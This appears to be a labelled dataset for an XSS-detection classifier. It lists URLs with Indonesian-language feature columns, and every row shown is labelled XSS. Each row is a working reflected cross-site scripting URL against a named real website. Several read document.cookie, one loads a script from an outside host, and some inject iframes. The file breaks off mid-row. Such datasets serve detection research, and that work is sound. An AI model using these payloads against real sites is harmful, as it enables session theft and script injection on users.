domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://img25.imagehaven.net/img.php?id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://infoguides.gmu.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://inspeak.com/index.php?APP_current_action=viewmodule&APP_current_module=%3Cscript%3Ealert%28123%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://it.altervista.org/wiki/index.php?search=%3C%2Ftitle%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ns0=1&title=Speciale%3ARicerca&fulltext=Search&fulltext=Ricerca;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://jogjacamp.org/demo/jcommerce_demo/index.php?action=store.showProduct&product_id=%3Cscript%20src=http://xwungu.net46.net/XSS.js%3E%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://jqueryui.com/themeroller/#ffDefault=\"\"/><script>alert(/Xss: Vijayendra/)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://kaspersky.softkey.ru/?prodid=541501'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&site=642&from=3201552&noreg=Y&clear=Y&referer1=kl_main&referer2=kl_store;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://kids.britannica.com/search?query=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22cyb3r_pr3dat0r%22%29%3C%2FSCRIPT%3E%22%3E&fuzzy=true&ct=null&autobounce=true;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://kompetenzatlas-hessen.de/suche/sucheaction_new.cfm?sort=firma&dir=ASC&startrow=1&superbid=;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://l.yimg.com/m/ver/270.0/embed-2008-08-14-1438/fullscreen.html?&seek=0&kbps=0&eAutoStart=%22%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://l8url.com/?longUrl=%22%3E<script>alert(document.cookie)</script>;Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://lavillette.com/recherche/?q=%3Cscript%3Edocument.write(String.fromCharCode(60,%20105,%20102,%20114,%2097,%20109,%20101,%2032,%20115,%20114,%2099,%2061,%2034,%20104,%20116,%20116,%20112,%2058,%2047,%2047,%20120,%20115,%20115,%20101,%20100,%2046,%2099,%20111,%20109,%2034,%2062))%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://lcci.com.pk/dir_search_result4.php?search_text='>\"\"><script>alert('Xssed By Pierre')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://legalresearch.usfca.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.bc.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.cabq.gov/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.hcc.hawaii.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.metro.org/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.mit.edu/searchtags.php?iid=148&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.olympic.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.princeton.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.sbuniv.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://libguides.sit.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://libguides.uwlax.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://library.leeds.ac.uk/site/scripts/google_results.php?q=bentley&stylesheet=%22%3E%3Cscript%3Ealert%28%27raVen%27%29%3C/script%3E&collections=libcms;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://linkdefteri.com/devami.php?kategori=18=\"\"><script>alert(document.cookie)</script><marquee>ThR0ad</marquee>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://linkdefteri.com/sitegit.php?id=22829=\"\"><script>alert(document.cookie)</script><marquee>ThR0ad</marquee>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://linkdefteri.com/uclu.php?istek=yeniler=\"\"><script>alert(document.cookie)</script><marquee>ThR0ad</marquee>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://loadgamesvf.bet365.com/f1x2games/loadGame.jsp?gameID=F1X2_FOOTBALL&version=1&lang=%22en&acc_id=1EC6296318CF49888464BDA22A78EB2C000004&baseURL=%22);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://logiclord.com/index.php?x=0&y=0&s=\"\"%2F><script>alert(\"\"Xss: Vijayendra\"\")</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://login.community.virgilio.it/community/people.html?a2_chId=people&a2_finUrlOk=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://m.fotolog.com/search.php?auth=%3Ch1%3ERME%20Pwnea%20de%20Nuevo%3C/h1%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cnoscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://m.mediamarkt.de/node/8?plzInput=<img src=x onerror=alert(document.cookie)>;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://m.spiegel.de/empfehlen/a-823284-de.html?f.emailempfang=<script>alert(navigator.userAgent)</script>;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://mappn.com/game.php?id=18%3Ciframe%20src=%22http://xssed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://mediathek.daserste.de/sendungen_a-z?buchstabe=%3C/script%3E%3Cscript%3Ealert(navigator.userAgent)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://members.driverguide.com/doc.php?page=%22%3E%3Chtml%3E%3Cscript%3Ealert(1337)%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://mitnicksecurity.com/workshop_signup.php?strFirstName=&strLastName=&strCompanyName=&strAddr1=&strAddr2=&strCity=&strState=&strCountry=&strZip =&strPhone=&strFax=&strEmail=%2F%22%3E%3Ciframe+onload%3Dalert%28document.cookie%29%3E&strNote=&reca ptcha_challenge_field=03AHJ_VuuJoRKGdWnVlf_2qdsFfYwSEoIIP09btuUPlEjlvPmJ1hV4oamI0XAbxagdd2y2IhSMiaqI TUxJc6vqqot_0NxyvP7LUWKVh2UW8Z-8_PakNdrpbEiswRttXHyMV4yJGZf8tG6Q5gFHYAYq4Nuat6pPmixNkA&recaptcha_res ponse_field=&submit=Submit;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://mleg.cse.sc.edu/edu/csce822/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://mobilecp.conduit.com/pages/Wizard?appId=677489db-2d88-4dbf-91a0-078a3d352e84&Insert \"\"'><img src=vul onerror=alert('r007k17-w')>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://money.cnn.com/search/index.html?sortBy=date&primaryType=mixed&source=money&query=%22%3E%3Ciframe+onload%3Dalert%28%2FXSS%2F%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://money.impaqmsn.com/content.aspx?id=%3Ciframe%20src%3D%22JaVaScRiPt:alert%28%28%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%27%29%29%3B%22%3E&ch=354;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://moviesmobile.net/hollywood-mobile-movies/kfp2/index.php?ratem=1\"\"/></script><script>alert(/Xss:Vijayendra/)</script>&rate=Rate\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://msn.iproperty.com.my/modules/property/listingsearch.aspx?searchType=EP&propertyType=AR&state=KL&city=%3CScRiPt%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20MSN%20Malaysia%20:D%27);%3C/ScRiPt%3E&minPrice=0&maxPrice=100000000&x=&y=&s=1&r=0\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://music.raag.fm/search.php?search_string=%27%22%3E%3Cscript%3Ealert%28%2Fhacked%2F%29%3C%2Fscript%3E&search_type=singer;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://my.dot.tk/registration/mailsignup?firstname=%22%3E%3Cscript%3Ealert(%27byebanyu.com.ar%27)%3C/script%3E&lastname=fun;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://nas.mbc.net/grp_article.php?article=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://natolibguides.info/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://new.davidguetta.com/fr/taxonomy/term/111?destination=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%280x00D0F6%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://nirog.info/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://noticias.uol.com.br/busca/?q=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E&rd=1&id=1&ads=on&ref=noticias_uol#q=ssssss\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://ns31.ashiyanehost.com/admin/views/bad_refferer.php?<script>alert('LastRider-CyberBellona')</script?;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://offshorelm.com/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://old.cageprisoners.com/articles.php?id=25632%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://openid-rp.virgilio.it/openid-rp/rpLogin?entryPoint=VirgilioOpenID&urlRitorno=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://orbi.ulg.ac.be/simple-search?query=%3Cscript%3Econfirm%28%22samir-dz-tjrs-maahboul-3lik%22%29%3C/script%3E%3Ciframe%20src=%22http://xssed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML 